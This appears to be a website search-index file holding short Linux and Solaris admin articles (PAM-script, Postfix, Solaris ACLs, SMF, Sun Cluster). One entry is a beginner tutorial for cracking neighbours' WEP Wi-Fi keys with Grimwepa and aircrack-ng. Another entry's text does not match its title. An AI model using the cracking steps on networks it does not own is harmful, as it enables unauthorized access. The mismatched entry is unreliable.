[ `ls ~/Maildir/.NoSpam/cur/ | wc | awk '{ print $1 }'` != 0 ] ; then mv ~/Maildir/.NoSpam/cur/* ~/Maildir/cur/ 2\u003e\u00261 /dev/null fi This creates two new folders in your mailbox (one for desired emails and one for undesired emails):\nIf spam is found in a folder and it is not detected as spam, put it in the Spam folder. If an email arrives as spam when it is not, put it in the NoSpam folder to make it valid. This way, SpamAssassin will analyze the email so that next time, it arrives without being detected as spam. Finally, if your Spam and NoSpam folders don’t exist in your mailboxes:\nmkdir -p ~/Maildir/.Spam/cur/ ~/Maildir/.NoSpam/cur/ But I recommend creating these folders with your regular email client.\nFAQ linkHow can I test if the SPF module is working properly? linkPut a simple valid email in sample-nonspam.txt and run this command:\nspamassassin -D \u003c sample-nonspam.txt You should see something like this:\n.... debug: registering glue method for check_for_spf_helo_pass (Mail::SpamAssassin::Plugin::SPF=HASH(0x8d21990)) .... "
            }
        );
    index.add(
            {
                id:  447 ,
                href: "\/Forcer_un_utilisateur_%C3%A0_changer_son_mot_de_passe_%C3%A0_la_premi%C3%A8re_connexion\/",
                title: "Force User to Change Password at First Login",
                description: "How to force users to change their password on first login by setting account expiration",
                content: "Introduction linkIndeed, I was looking for how to force a user to change their password during their first login session. Well, nothing obvious except that if we set an account to expire, the user will then be forced to change their password.\nUsage linkIf you are root, you can specify the user whose account you want to expire as follows:\nchsh -s /bin/MySecureShell username And otherwise, a user can change their shell themselves like this:\nchsh -s /bin/MySecureShell "
            }
        );
    index.add(
            {
                id:  448 ,
                href: "\/PAM-script_:_Executer_des_scripts_%C3%A0_l%27authentification,_l%27ouverture_et_la_fermeture_de_session\/",
                title: "PAM-script: Execute Scripts at Authentication, Session Open and Close",
                description: "Learn how to use PAM-script module to execute scripts during authentication, session opening and closing on Linux systems.",
                content: "Introduction linkYou may need to run some operations at authentication, session opening or closing. Here is a PAM module I’ve found that allows this functionality.\nInstallation linkDownload the module from the Freshmeat project and extract it:\nwget http://freshmeat.net/redir/pam_script/22413/url_tgz/libpam-script_0.1.12.tar.gz tar -xzvf libpam-script_0.1.12.tar.gz Now install the dependencies:\naptitude install libpam-dev gcc make Now compile it:\n$ make gcc -Wall -pedantic -fPIC -shared -o pam_script.so pam_script.c Now you just need to copy it:\ncp pam_script.so /lib/security Configuration linkPAM linkSession linkIf you want to launch something with root permissions at session startup, edit the /etc/pam.d/common-session and add this line:\nsession required pam_mkhomedir.so skel=/etc/skel/ umask=0022 session required pam_script.so runas=root onsessionopen=/etc/security/onsessionopen session sufficient pam_ldap.so session required pam_unix After pam_script, you can configure:\nrunas: choose the user you want to run script (runas=root) onsessionopen: this script will be launched on started session (onsessionopen=/etc/security/onsessionopen) onsessionclose: this script will be launched on closed session (onsessionclose=/etc/security/onsessionclose) Auth linkYou may also want to launch something at authentication:\nauth required pam_unix.so nullok_secure auth required pam_script.so onauth=/etc/security/onauth Scripts linkJust create the default scripts and add the necessary permissions:\ntouch /etc/security/onsessionopen /etc/security/onsessionclose /etc/security/onauth chmod 755 /etc/security/onsessionopen /etc/security/onsessionclose /etc/security/onauth And add this minimum content:\n#!/bin/sh Test \u0026 Debug linkYou can now test by adding for example “touch /tmp/test_ok” on the “onsessionopen” script. To have more details, please look at the logs:\n$ tail /var/log/auth.log Jul 15 13:03:35 moonlight sshd[3777]: PAM-script: Real User is: pmavro Jul 15 13:03:35 moonlight sshd[3777]: PAM-script: Command is: /etc/security/onsessionopen Jul 15 13:03:35 moonlight sshd[3777]: PAM-script: Executing uid:gid is: 0:0 All looks good :-)\n"
            }
        );
    index.add(
            {
                id:  449 ,
                href: "\/Grimwepa%5C_:_le_hack_wifi_facile\/",
                title: "Grimwepa: Easy WiFi Hacking",
                description: "A guide to using Grimwepa for wireless network security testing in Ubuntu",
                content: "Introduction linkThis method is really designed for beginners and allows for easy cracking of wireless networks without any networking knowledge. It’s not the kind of method I usually prefer since it enables 16-year-olds to think they’re NASA-level hackers with these tools… but anyway.\nThis method is very practical when you don’t have much time. For the OS, I obviously recommend BackTrack, but Ubuntu can also work. For this tutorial, I’ll use Ubuntu.\nInstallation linkaircrack-ng linkLet’s install aircrack-ng to get all the necessary binaries:\naptitude install aircrack-ng openjdk-6-jre Grimwepa linkIt’s recommended to install grimwepa using this method:\nwget http://grimwepa.googlecode.com/files/grimstall.sh chmod 755 grimstall.sh sudo ./grimstall.sh install Configuration linkFor configuration, we just need to activate monitoring mode on our wireless interface. I’m using a DLINK DWL-G122 with a RALINK chipset that allows me to perform injections, etc. To activate this mode:\nsudo airmon-ng start wlan1 Found 7 processes that could cause trouble. If airodump-ng, aireplay-ng or airtun-ng stops working after a short period of time, you may want to kill (some of) them! PID\tName 1200\tNetworkManager 1202\tavahi-daemon 1204\tavahi-daemon 1478\twpa_supplicant 3183\tdhclient 16461\tdhclient 17269\tdhclient Process with PID 16461 (dhclient) is running on interface wlan0 Process with PID 17269 (dhclient) is running on interface wlan1 Interface\tChipset\tDriver wlan0\tIntel 4965/5xxx\tiwlagn - [phy0] wlan1\tRalink 2573 USB\trt73usb - [phy1] (monitor mode enabled on mon0) Monitor mode is now active on mon0 :-)\nUtilization linkNow, let’s launch grimwepa:\nsudo java -jar grimwepa_X.X.jar Select the mon0 interface, then click on “Refresh Targets”, you should see it scanning:\nStop after about 3 scans, that’s sufficient. Choose a network with WEP encryption (faster because it’s older and therefore easier to crack). Then select “Fragmentation” as the attack method and choose an available client. Then click on “Start Attack”:\nA window should open that will listen to what’s happening on this network:\nOnce there is enough data (which can take some time depending on traffic), an airmon-ng window will start to launch injections. From this point, it will go relatively quickly. The WEP key cracking will follow. The key will then be displayed in the status.\nResources linkhttps://code.google.com/p/grimwepa/\n"
            }
        );
    index.add(
            {
                id:  450 ,
                href: "\/Upgrader_SUN_Cluster\/",
                title: "Upgrading SUN Cluster",
                description: "Guide on how to upgrade a SUN Cluster with detailed step-by-step instructions",
                content: "1. Introduction linkUpgrading a cluster is not an easy task. I’ll explain here the steps to follow.\n2. Preparing environment linkFirst of all, you need to be sure you don’t have any running services (You should do those step for all your servers).\nThen you need to boot in a non cluster mode:\nreboot -- -x You also need to download the latest version of Sun Cluster and unzip it in /export/home/patchs/ for example.\n3. Upgrade link3.1 Normal way linkNow start installer (here: /export/home/patchs/Solaris_x86):\n/export/home/patchs/Solaris_x86/installer During the wizard, choose “All Shared Components” to upgrade your SUN Cluster version.\nNow you need to upgrade all your component, choose to upgrade the whole cluster structure:\n\u003e /export/home/patchs/Solaris_x86/Product/sun_cluster/Solaris_10/Tools/scinstall *** Main Menu *** Please select from one of the following (*) options: 1) Create a new cluster or add a cluster node 2) Configure a cluster to be JumpStarted from this install server * 3) Manage a dual-partition upgrade * 4) Upgrade this cluster node * 5) Print release information for this cluster node * ?) Help with menu options * q) Quit Option: 4 So you normally need to select option 1.\nAfter that, you need to update all agents (using option 2).\nThen reboot this node and apply this to all the nodes of your cluster.\n3.2 Fast way linkIf you need a faster way, you can do like this (you need to exactly know what you have installed):\ncd /export/home/patchs/Solaris_x86/Product/sun_cluster/Solaris_10/Tools ./scinstall -u update ./scinstall -u update -d /export/home/patchs/Solaris_x86/Product/sun_cluster_agents -s tomcat,smb,PostgreSQL,mys,dhcp,container,9ias,oracle,iws,dns,apache reboot 4. Verification linkYou can now verify by looking at /etc/cluster/release file:\n\u003e cat /etc/cluster/release Sun Cluster 3.2u3 for Solaris 10 i386 Copyright 2008 Sun Microsystems, Inc. All Rights Reserved. "
            }
        );
    index.add(
            {
                id:  451 ,
                href: "\/ACL_Implementation_droits_type_NT_sur_Solaris\/",
                title: "ACL: Implementing NT-Style Permissions on Solaris",
                description: "How to implement and use NT-style ACLs (Access Control Lists) on Solaris systems for more flexible file permissions management.",
                content: "Introduction linkWith respect to a computer filesystem, an access control list (ACL) is a list of permissions attached to an object. An ACL specifies which users or system processes are granted access to objects, as well as what operations are allowed to be performed on given objects. In a typical ACL, each entry in the list specifies a subject and an operation (e.g. the entry (Alice, delete) on the ACL for file WXY gives Alice permission to delete file WXY).\nThis documentation is a quick reference. If you need more detailed explanations, please refer to the SUN ACL documentation on their website.\nEnabling ACL linkBy default, on ZFS, ACLs are automatically enabled. However, there are different modes to choose from based on your usage requirements.\nYou can see the current default configuration with the “zfs get all” command:\n$ zfs get all zfs_volume NAME PROPERTY VALUE SOURCE zfs_volume type filesystem - ... zfs_volume aclmode groupmask default zfs_volume aclinherit restricted default ... Inheritance mode linkaclinherit - This property determines the behavior of ACL inheritance. Values include the following:\ndiscard - For new objects, no ACL entries are inherited when a file or directory is created. The ACL on the file or directory is equal to the permission mode of the file or directory. noallow - For new objects, only inheritable ACL entries that have an access type of deny are inherited. restricted - For new objects, the write_owner and write_acl permissions are removed when an ACL entry is inherited. passthrough - When property value is set to passthrough, files are created with a mode determined by the inheritable ACEs. If no inheritable ACEs exist that affect the mode, then the mode is set in accordance to the requested mode from the application. passthrough-x - Has the same semantics as passthrough, except that when passthrough-x is enabled, files are created with the execute (x) permission, but only if execute permission is set in the file creation mode and in an inheritable ACE that affects the mode. The default mode for the aclinherit is restricted.\nRights on creation mode linkaclmode - This property modifies ACL behavior when a file is initially created or whenever a file or directory’s mode is modified by the chmod command. Values include the following:\ndiscard - All ACL entries are removed except for the entries needed to define the mode of the file or directory. groupmask - User or group ACL permissions are reduced so that they are no greater than the group permission bits, unless it is a user entry that has the same UID as the owner of the file or directory. Then, the ACL permissions are reduced so that they are no greater than owner permission bits. passthrough - During a chmod operation, ACEs other than owner@, group@, or everyone@ are not modified in any way. ACEs with owner@, group@, or everyone@ are disabled to set the file mode as requested by the chmod operation. The default mode for the aclmode property is groupmask.\nChanging mode linkYou can change mode with commands like these:\nzfs set aclmode=passthrough zfs_volume zfs set aclinherit=passthrough zfs_volume Simply choose the one you prefer for your needs.\nACL Properties linkExample linkYou can use the ls command with special arguments to see current ACL rights. Choose the format that’s easier for you to read.\nls -dv: $ ls -dv zfs_volume drwxrwxr-x 11 myuser mygroup 11 oct 14 12:06 zfs_volume 0:owner@::deny 1:owner@:list_directory/read_data/add_file/write_data/add_subdirectory /append_data/write_xattr/execute/write_attributes/write_acl /write_owner:allow 2:group@::deny 3:group@:list_directory/read_data/add_file/write_data/add_subdirectory /append_data/execute:allow 4:everyone@:add_file/write_data/add_subdirectory/append_data/write_xattr /write_attributes/write_acl/write_owner:deny 5:everyone@:list_directory/read_data/read_xattr/execute/read_attributes /read_acl/synchronize:allow ls -dV: $ ls -dV zfs_volume drwxrwxr-x 11 myuser mygroup 11 oct 14 12:06 zfs_volume owner@:--------------:------:deny owner@:rwxp---A-W-Co-:------:allow group@:--------------:------:deny group@:rwxp----------:------:allow everyone@:-w-p---A-W-Co-:------:deny everyone@:r-x---a-R-c--s:------:allow Complete properties list linkACL Entry Types link ACL Entry Type Global Description owner@ yes Specifies the access granted to the owner of the object. group@ yes Specifies the access granted to the owning group of the object. everyone@ yes Specifies the access granted to any user or group that does not match any other ACL entry. With a user name, specifies the access granted to an additional user of the object. user no Must include the ACL-entry-ID, which contains a username or userID. If the value is not a valid numeric UID or username, the ACL entry type is invalid. group no Must include the ACL-entry-ID, which contains a groupname or groupID. If the value is not a valid numeric GID or groupname, the ACL entry type is invalid. ACL Access Privileges link Access Privilege Compact Access Privilege Description add_file w Permission to add a new file to a directory. add_subdirectory p On a directory, permission to create a subdirectory. append_data p Placeholder. Not currently implemented. delete d Permission to delete a file. delete_child D Permission to delete a file or directory within a directory. execute x Permission to execute a file or search the contents of a directory. list_directory r Permission to list the contents of a directory. read_acl c Permission to read the ACL (ls). read_attributes a Permission to read basic attributes (non-ACLs) of a file. read_data r Permission to read the contents of the file. read_xattr R Permission to read the extended attributes of a file or perform a lookup in the file’s extended attributes directory. synchronize s Placeholder. Not currently implemented. write_xattr W Permission to create extended attributes or write to the extended attributes directory. write_data w Permission to modify or replace the contents of a file. write_attributes A Permission to change the times associated with a file or directory to an arbitrary value. write_acl C Permission to write the ACL or the ability to modify the ACL by using the chmod command. write_owner o Permission to change the file’s owner or group. ACL Inheritance Flags link Inheritance Flag Compact Inheritance Flag Description file_inherit f Only inherit the ACL from the parent directory to the directory’s files. dir_inherit d Only inherit the ACL from the parent directory to the directory’s subdirectories. inherit_only i Inherit the ACL from the parent directory but applies only to newly created files or subdirectories and not the directory itself. no_propagate n Only inherit the ACL from the parent directory to the first-level contents of the directory, not the second-level or subsequent contents. - N/A No permission granted. Rights Management linkAdding rights linkTo add rights to a folder or file using ACLs:\n$ chmod A+user:myuser:read_data/execute:allow directory A+: A means use ACL and + means add user:myuser: add username (here myuser) read_data/execute:allow: allowing these rights directory: the directory to change You can verify the user has been added with their rights:\n$ ls -dv test.dir drwxr-xr-x+ 2 root root 2 Aug 31 12:02 directory 0:user:myuser:list_directory/read_data/execute:allow 1:owner@::deny 2:owner@:list_directory/read_data/add_file/write_data/add_subdirectory /append_data/write_xattr/execute/write_attributes/write_acl /write_owner:allow 3:group@:add_file/write_data/add_subdirectory/append_data:deny 4:group@:list_directory/read_data/execute:allow 5:everyone@:add_file/write_data/add_subdirectory/append_data/write_xattr /write_attributes/write_acl/write_owner:deny 6:everyone@:list_directory/read_data/read_xattr/execute/read_attributes /read_acl/synchronize:allow For a faster alternative, you can use:\n$ chmod A+user:myuser:rx:allow directory Deleting rights linkTo remove the previously added user (ID 0):\n$ chmod A0- directory A0-: A for ACL, 0 for ID 0, and - for deleting Verify the user has been removed:\n$ ls -dv test.dir drwxr-xr-x+ 2 root root 2 Aug 31 12:02 directory 0:owner@::deny 1:owner@:list_directory/read_data/add_file/write_data/add_subdirectory /append_data/write_xattr/execute/write_attributes/write_acl /write_owner:allow 2:group@:add_file/write_data/add_subdirectory/append_data:deny 3:group@:list_directory/read_data/execute:allow 4:everyone@:add_file/write_data/add_subdirectory/append_data/write_xattr /write_attributes/write_acl/write_owner:deny 5:everyone@:list_directory/read_data/read_xattr/execute/read_attributes /read_acl/synchronize:allow You can delete another right by changing the number (e.g., A4-).\nTo completely remove all ACLs:\n$ chmod A- directory Replacement linkTo replace an existing right with another:\n$ chmod A0=user:myuser:execute:deny directory This changes the specified ACL entry (ID 0) to deny execute permission for myuser.\nFor a faster alternative:\n$ chmod A0=user:myuser:x:deny directory warning DO NOT FORGET TO SPECIFY ID OR IT WILL REPLACE ALL YOUR CURRENT RIGHTS WITH THIS SINGLE ONE To replace all rights with only one user permission:\nchmod A=user:myuser:read_data:allow directory This removes all other rights, including owner permissions:\n$ ls -v directory ----------+ 1 root root 2455 Dec 25 12:08 directory 0:user:myuser:read_data:allow You can also reset rights using standard chmod:\nchmod 755 directory This restores the standard permission set with ACLs.\nInheritance linkRemember that file and directory inheritance depends on the ACL mode you’ve chosen. To add inheritance:\n$ chmod A+user:myuser:read_data/execute:file_inherit:allow directory This works only for files. Use dir_inherit for directories.\nReferences linkhttps://docs.sun.com/app/docs/doc/819-5461?l=en\n"
            }
        );
    index.add(
            {
                id:  452 ,
                href: "\/Changer_les_locales_de_Solaris\/",
                title: "Changing Solaris Locales",
                description: "How to change locale settings on Solaris systems to fix locale-related error messages and properly configure internationalization.",
                content: "Introduction linkYou may encounter messages like “couldn’t set locale correctly” which can quickly become annoying to see in the display.\nProblem Explanation linkThis occurs because the locales installed on the machine do not match those in your shell’s environment variables.\nTo see what you have in your shell:\n\u003e env And to see what’s available on the system, it’s just as simple:\n\u003e ls /usr/lib/locale C Solution linkFor my part, I live in France, so I need the locales for my country. I’m going to install the Western European locales. For this, you’ll need the Solaris DVD in the drive:\ncd /cdrom/cdrom0/Solaris_10/Product/ pkgadd -d . SUNWweuos Now it’s good, there will be no more error messages.\nTo change Solaris locales at the system level, edit the /etc/default/init file and adapt according to your needs:\nTZ=Europe/Paris CMASK=022 LC_COLLATE=fr_FR.ISO8859-15 LC_CTYPE=fr_FR.ISO8859-15 LC_MESSAGES=fr LC_MONETARY=fr_FR.ISO8859-15 LC_NUMERIC=fr_FR.ISO8859-15 LC_TIME=fr_FR.ISO8859-15 LC_COLLATE=fr_FR.ISO8859-15 LC_CTYPE=fr_FR.ISO8859-15 LC_MESSAGES=fr LC_MONETARY=fr_FR.ISO8859-15 LC_NUMERIC=fr_FR.ISO8859-15 LC_TIME=fr_FR.ISO8859-15 Resources linkhttps://developers.sun.com/dev/gadc/faq/locale.html\n"
            }
        );
    index.add(
            {
                id:  453 ,
                href: "\/R%C3%A9glage_de_probl%C3%A8mes\/",
                title: "Troubleshooting mails with Postfix",
                description: "This documentation provides various methods and solutions for troubleshooting mail server problems, especially in Postfix environments.",
                content: "Introduction linkPostfix is great and handles high loads well, but when you need to debug mail problems, it can become less straightforward. Therefore, I’ll document here all the tips and tricks I’ve found.\nSolutions linkVerify the configuration linkIn Postfix, it’s not always obvious to find the problem, which is why they’ve been kind enough to include a command that will run checks:\npostfix check Mail queue congestion linkIf you find yourself with a mail queue congestion problem (e.g., 30,000 emails in the queue), you can find out how many there are with the following command:\nmailq But if you have to delete them one by one, it’s a bit tedious. That’s why I created a small script to delete the entire queue:\n#!/usr/bin/perl # Mailq flusher # Made by Pierre Mavro use strict; # Vars my $queue_id; my @queue_ids; my @mails_addresses; my $postsuper_command; my $found_body=0; # Starting die \"Sorry but you need to give an email address in argument :\\n\\teg. ./queue_flush_users.pl \\n\" if (! defined($ARGV[0])); # Read the Postfix mailq open MAIL_QUEUE, \"mailq |\"; # Put in arrays mails addresses and queue ids while () { my $mail_address; chomp $_; if ($_ =~ /\\s+(.+)\\@(.+)/i) { $mail_address=\"$1\\@$2\"; } if ($_ =~ /^(\\w+|\\w+\\*).+:\\d+\\s+(.+)\\@(.+)/i) { $queue_id=$1; $mail_address=\"$2\\@$3\"; } if (defined($mail_address)) { push @queue_ids, $queue_id; push @mails_addresses, $mail_address; } } close(MAIL_QUEUE); my $total_mails=@mails_addresses; for (0..$total_mails) { if ($ARGV[1] eq $mails_addresses[$_]) { if ($ARGV[0] eq \"test\") { print \"$queue_ids[$_] : $mails_addresses[$_]\\n\"; } elsif ($ARGV[0] eq \"delete\") { $postsuper_command=`postsuper -d $queue_ids[$_]`; } $found_body++; } elsif ($ARGV[0] eq \"viewall\") { print \"$queue_ids[$_] : $mails_addresses[$_]\\n\"; $found_body++; } } die \"Sorry but nobody has been found.\\n\" if ($found_body == 0) This script allows you to select a user and delete all emails where they are involved.\npflogsumm linkpflogsumm provides information about emails, including statistics like who receives a lot of emails, who sends a lot, etc. To get logs for the day:\npflogsumm -d today /var/log/mail.log Get statistics from yesterday:\npflogsumm -d yesterday /var/log/mail.log.0 On the current log file:\npflogsumm /var/log/mail.log Note:\npflogsumm /var/log/mail.log.0 will not give statistics just for yesterday.\nqshape linkFor bottleneck analysis, you can use the qshape command:\nqshape -s hold For more info:\nhttp://postfix.traduc.org/index.php/QSHAPE_README.html\nfatal: open database /etc/aliases.db: No such file or directory linkYou simply need to regenerate the alias database. The “newaliases” command will be enough. But on Solaris, and apparently older versions of Postfix, you’ll need to stop and start the service as well:\nsvcadm disable svc:/network/smtp/postfix:default ; newaliases ; postalias ; svcadm enable svc:/network/smtp/postfix:default exec failed. errno=2. linkOn Solaris, when trying to send a message with the mail command and it doesn’t work, giving this error:\nexec failed. errno=2. Just create a symbolic link:\nln -s /opt/csw/sbin/sendmail /usr/lib "
            }
        );
    index.add(
            {
                id:  454 ,
                href: "\/SMF_:_Service_Management_Facility\/",
                title: "SMF: Service Management Facility",
                description: "A comprehensive guide to Solaris Service Management Facility (SMF), covering service management, runlevels, milestones, and configuration of services.",
                content: "Introduction linkSMF services are listed by categories:\napplication device legacy milestone network platform site system Example:\nsvc:/system/filesystem/root:default The prefix svc indicates that it’s a service managed by SMF The category of the service is “system” The service itself is a filesystem The instance of the service is the root of the file system The word “default” identifies the first, in this case only, instance of the service Another example:\nlrc:/etc/rc3_d/S90samba The name “lrc” indicates that the running service is not managed by SMF The pathname “/etc/rc3_d” refers to the folder “/etc/rc3.d” where the script is used to be managed The script name is S90samba To list the names and states of services:\n$ svcs STATE STIME FMRI legacy_run Feb_10 lrc:/etc/rc2_d/S10lu legacy_run Feb_10 lrc:/etc/rc2_d/S20sysetup legacy_run Feb_10 lrc:/etc/rc2_d/S90wbem legacy_run Feb_10 lrc:/etc/rc2_d/S99dtlogin legacy_run Feb_10 lrc:/etc/rc3_d/S81volmgt (output removed) online Feb_10 svc:/system/system-log:default online Feb_10 svc:/system/fmd:default online Feb_10 svc:/system/console-login:default online Feb_10 svc:/network/smtp:sendmail online Feb_10 svc:/milestone/multi-user:default online Feb_10 svc:/milestone/multi-user-server:default online Feb_10 svc:/system/zones:default offline Feb_10 svc:/application/print/ipp-listener:default offline Feb_10 svc:/application/print/rfc1179:default maintenance 10:24:15 svc:/network/rpc/spray:default Here’s the list of possible states:\nState Description online The service instance is enabled and has successfully started. offline The service instance is enabled, but the service is not yet running or available to run. disabled The service instance is not enabled and is not running. legacy_run The legacy service is not managed by SMF, but the service can be observed. This state is only used by legacy services. uninitialized This state is the initial state for all services before their configuration has been read. maintenance The service instance has encountered an error that must be resolved by the administrator. degraded The service instance is enabled, but is running at a limited capacity. Runlevels and Milestones Management linkHere are the different service types:\nsingle-user multi-user multi-user-server network name-services sysconfig devices Here’s the relationship between milestones and services:\nHere’s an example of the relationship between dependencies:\nTo determine the current milestones:\n$ svcs Here are the states that a milestone can take:\nnone single-user multi-user multi-user-server all To choose which milestone you want to boot into:\nok\u003e boot -m milestone=single-user Note: svc.startd is a daemon.\nThe database listing all these services is located here:\n/etc/svc/repository.db This database is managed by the svc.configd service.\nIf there’s an error at this level, your machine won’t boot. To repair this, boot in single user mode and run this command:\n/lib/svc/bin/restore_repository Here’s a list of milestones and runlevels:\nRun Level Milestone Description 0 System is running the PROM monitor. s or S single-user Solaris OS single-user mode with critical file systems mounted and accessible. 1 The system is running in a single-user administrative state with access to all available file systems. 2 multi-user The system is supporting multiuser operations. Multiple users can access the system. All system daemons are running except for the Network File System (NFS) server and some other network resource server related daemons. 3 multi-user-server The system is supporting multiuser operations and has NFS resource sharing and other network resource servers available. 4 This level is currently not implemented. 5 A transitional run level in which the Solaris OS is shut down and the system is powered off. 6 A transitional run level in which the Solaris OS is shut down and the system reboots to the default run level. To know which runlevel you’re in, use this command:\nwho -r For runlevels, you can find in /etc/ or /sbin the different runlevels:\nrc0 rc1 rc2 rc3 rc4 rc5 rc6 rcS When you look in one of these folders, you can see boot and stop processes. To distinguish them:\nK for Kill S for Start To know the current process with respect to the daemon:\n$ ls -i S90samba 4715 samba The Boot Process linkIf you’ve followed along correctly, you should understand that the boot order looks like this:\nPROM boot phase Boot program phase Kernel initialization phase Init phase svc.startd phase During the boot phase, the kernel reads its configuration file /etc/system, then loads modules. It uses the “ufsboot” command to load the files.\nThen it loads the /etc/init daemon.\nHere’s what you can find in the /etc/system file:\nmoddir Searches for any modules to load\nroot device and root file system configuration By default: rootfs:ufs\nThis is for the root file system. Example:\nrootdev:/sbus@1,f8000000/esp@0,800000/sd@3,0:a exclude Won’t load the listed modules. Example:\nexclude: sys/shmsys forceload Forces loading certain modules. Example:\nforceload: drv/vx set Changes kernel parameters to modify system operations. Example:\nset maxusers=40 Make a copy of the /etc/system file before saving changes. If the file is incorrect, you won’t be able to boot. If you have a problem with the modified file, here’s the solution to repair:\n$ ok boot -a Enter filename [kernel/sparcv9/unix]: Enter default directory for modules [/platform...]: Name of system file [etc/system]: etc/system.orig - or - /dev/null root filesystem type [ufs]: Enter physical name of root device [/...]: (further boot messages omitted) Inittab linkEach line in this file looks like this:\nid:rstate:action:process Here are the fields:\nField Description id Two character identifier for the entry rstate Run levels to which this entry applies action Defines how the process listed should be run\nFor a description of the action keywords see man inittab process Defines the command to execute By default, here’s what you find in the inittab file:\nap::sysinit:/sbin/autopush -f /etc/iu.ap sp::sysinit:/sbin/soconfig -f /etc/sock2path smf::sysinit:/lib/svc/bin/svc.startd\t\u003e/dev/msglog 2\u003c\u003e/dev/msglog /dev/msglog 2\u003c\u003e/dev/msglog For possible actions, we have:\nsysinit Executes the process before the init process tries to access the console (for example, the console login prompt). The init process waits for completion of the process before it continues to read the inittab file.\npowerfail Executes the process only if the init process receives a power fail signal.\nThe svc.startd daemon is the replacement for init. To view the current configuration:\n/var/svc/manifest If you want to see milestone files to edit them:\nsingle-user.xml multi-user.xml multi-user-server.xml network.xml name-services.xml sysconfig.xml /sbin/rc2 /lib/svc/method/fs-local SVCS linkHere’s the command to monitor SMF services:\n$ svcs STATE STIME FMRI legacy_run 13:45:11 lrc:/etc/rcS_d/S29wrsmcfg legacy_run 13:45:37 lrc:/etc/rc2_d/S10lu legacy_run 13:45:38 lrc:/etc/rc2_d/S20sysetup legacy_run 13:45:38 lrc:/etc/rc2_d/S40llc2 legacy_run 13:45:38 lrc:/etc/rc2_d/S42ncakmod legacy_run 13:45:39 lrc:/etc/rc2_d/S47pppd (output omitted) online 13:45:36 svc:/network/smtp:sendmail online 13:45:38 svc:/network/ssh:default online 13:45:38 svc:/system/fmd:default online 13:45:38 svc:/application/print/server:default online 13:45:39 svc:/application/print/rfc1179:default online 13:45:41 svc:/application/print/ipp-listener:default online 13:45:45 svc:/milestone/multi-user:default online 13:45:53 svc:/milestone/multi-user-server:default online 13:45:54 svc:/system/zones:default online 8:46:25 svc:/system/filesystem/local:default online 8:46:26 svc:/network/inetd:default online 8:46:32 svc:/network/rpc/meta:tcp online 8:46:32 svc:/system/mdmonitor:default online 8:46:38 svc:/milestone/multi-user:default online 13:14:35 svc:/network/telnet:default maintenance 8:46:21 svc:/network/rpc/keyserv:default To verify the status of a service:\n$ svcs svc:/system/console-login:default STATE STIME FMRI online 14:38:27 svc:/system/console-login:default To view the dependencies of a service:\nsvcs -d svc:/system/filesystem/local:default STATE STIME FMRI online 14:38:15 svc:/system/filesystem/minimal:default online 14:38:26 svc:/milestone/single-user:default This shows what a service needs (dependencies):\n$ svcs -d milestone/multi-user:default STATE STIME FMRI online 13:44:53 svc:/milestone/name-services:default online 13:45:12 svc:/milestone/single-user:default online 13:45:13 svc:/system/filesystem/local:default online 13:45:15 svc:/network/rpc/bind:default online 13:45:16 svc:/milestone/sysconfig:default online 13:45:17 svc:/system/utmp:default online 13:45:19 svc:/network/inetd:default online 13:45:31 svc:/network/nfs/client:default online 13:45:34 svc:/system/system-log:default online 13:45:36 svc:/network/smtp:sendmail Here we can see other services that depend on /system/filesystem/local:\n$ svcs -D svc:/system/filesystem/local STATE STIME FMRI disabled 14:38:00 svc:/network/inetd-upgrade:default disabled 14:38:07 svc:/network/nfs/server:default online 14:38:30 svc:/network/inetd:default online 14:38:30 svc:/network/smtp:sendmail online 14:38:30 svc:/system/cron:default online 14:38:30 svc:/system/sac:default online 14:38:45 svc:/system/filesystem/autofs:default online 14:38:47 svc:/system/dumpadm:default online 14:38:51 svc:/milestone/multi-user:default svcadm linkThis command is used to change the state of a service:\n$ ps -ef $ svcs cron STATE STIME FMRI online 14:38:30 svc:/system/cron:default $ svcadm -v disable system/cron:default system/cron:default disabled. svcs cron STATE STIME FMRI disabled 20:35:25 svc:/system/cron:default ps -ef $ svcadm -v enable system/cron:default system/cron:default enabled. $ svcs cron STATE STIME FMRI online 20:35:59 svc:/system/cron:default $ ps -ef To temporarily disable the cron service:\nsvcadm -v disable -t system/cron:default svc:/system/cron:default temporarily disabled. Managing a Non-SMF Service linkinit.d is here:\n$ svcs $ ps -ef ls /etc/init.d/volmgt /etc/init.d/volmgt /etc/init.d/volmgt stop $ ps -ef $ /etc/init.d/volmgt start volume management starting. $ ps -ef svcs Creating a Service Managed by SMF linkThis procedure can be a bit complex for the uninitiated. Here’s the chronological order to follow:\nDetermine which milestones and run levels this service should be available at, and the appropriate command to start and stop the service. Establish relationships between dependencies, the service, and other services. Create a script in /lib/svc/method to start the process if necessary. Create an .xml file in the appropriate subdirectory. Make a copy of the “Service Repository Database”. Integrate this script into SMF using the svccfg utility. Create the file /lib/svc/method/newservice:\n#!/sbin/sh # # Copyright 2004 Sun Microsystems, Inc. All rights reserved. # Use is subject to license terms. # # ident \"@(#)newservice 1.14 04/08/30 SMI\" case \"$1\" in 'start') /usr/bin/newservice \u0026 ;; 'stop') /usr/bin/pkill -x -u 0 newservice ;; *) echo \"Usage: PAGECONTENT { start | stop }\" ;; esac exit 0 Set permissions:\nchmod 744 /lib/svc/method/newservice Then create the file /var/svc/manifest/site/newservice.xml:\n\u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE service_bundle SYSTEM \"/usr/share/lib/xml/dtd/service_bundle.dtd.1\"\u003e New service cd /var/svc/manifest/milestone cp multi-user.xml /var/tmp vi multi-user.xml Here’s an example of the content:\nThe new service must be imported into SMF:\nsvccfg import /var/svc/manifest/site/newservice.xml Now it should be visible:\n$ svcs newservice STATE STIME FMRI online 8:43:45 svc:/site/newservice:default It should also be possible to manipulate the service using:\n$ svcadm -v disable site/newservice site/newservice disabled. $ svcs newservice STATE STIME FMRI disabled 9:11:38 svc:/site/newservice:default svcadm -v enable site/newservice site/newservice enabled. svcs newservice STATE STIME FMRI online 9:11:54 svc:/site/newservice:default We can see that the multiuser milestone for our new service is necessary to finish:\n$ svcs -d milestone/multi-user:default STATE STIME FMRI disabled 8:43:16 svc:/platform/sun4u/sf880drd:default online 8:43:16 svc:/milestone/name-services:default online 8:43:33 svc:/system/rmtmpfiles:default online 8:43:42 svc:/network/rpc/bind:default online 8:43:46 svc:/milestone/single-user:default online 8:43:46 svc:/system/utmp:default online 8:43:47 svc:/system/system-log:default online 8:43:47 svc:/system/system-log:default online 8:43:49 svc:/system/filesystem/local:default online 8:44:01 svc:/system/mdmonitor:default online 9:11:54 svc:/site/newservice:default Creating a Non-SMF Managed Service link First, we’ll create our script in init.d: vi /etc/init.d/filename See above for content, 